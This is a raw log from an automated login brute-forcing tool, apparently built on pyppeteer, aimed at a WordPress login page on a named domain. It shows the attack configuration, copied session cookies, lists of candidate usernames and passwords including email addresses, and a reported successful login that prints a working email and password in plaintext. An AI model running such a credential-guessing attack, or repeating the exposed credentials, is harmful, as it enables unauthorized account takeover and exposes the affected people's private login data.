INFO:pyppeteer.launcher:Browser listening on: ws://127.0.0.1:54029/devtools/browser/fd386e0a-ba4c-48e2-99fd-9f24930063d9
INFO:root:[webParser] Fetched user and password params from html
INFO:root:{
  "url": "https://alqlambara.com/qemam/wp-login.php",
  "pass_user": "pass_user.csv",
  "params_list": "params.json",
  "req_body": {
    "pwd": "astmamsh123",
    "log": "alqlambara@gmail.com"
  },
  "headers": {
    "Host": "defendtheweb.net",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-GB,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://defendtheweb.net/auth",
    "Content-Type": "application/multipart",
    "Content-Length": 109,
    "Origin": "https://defendtheweb.net",
    "Connection": "keep-alive",
    "Cookie": "auth_remember=a618176a078d576fe7e5f1a8c3b42d80f90de90c3c19af39f063ef0b1c9079a9; cookies_dismissed=1; PHPSESSID=cccd5b5d680h6qgterjt8gv2ta",
    "Upgrade-Insecure-Requests": 1,
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
  },
  "type": "javascript",
  "user_param": "log",
  "password_param": "pwd",
  "action": "https://alqlambara.com/qemam/wp-login.php",
  "req_body_type": "multipart",
  "Usernames": "0        alqlambara@gmail.com\n1                     mohamad\n2                       loool\n3    mohamadassi173@gmail.com\nName: Usernames, dtype: object",
  "Passwords": "0         asdasd\n1    astmamsh123\n2      bara12340\n3         asdasd\nName: Passwords, dtype: object"
}
INFO:pyppeteer.launcher:Browser listening on: ws://127.0.0.1:54038/devtools/browser/213c72e1-8f43-4e9a-b528-2b8460c4ad22
INFO:pyppeteer.launcher:Browser listening on: ws://127.0.0.1:54052/devtools/browser/2e119eeb-eb0e-4808-990c-ad7ed2b31595
INFO:root:login successfull

username: alqlambara@gmail.com
password: astmamsh123
INFO:pyppeteer.launcher:terminate chrome process...
INFO:pyppeteer.launcher:terminate chrome process...
INFO:pyppeteer.launcher:terminate chrome process...
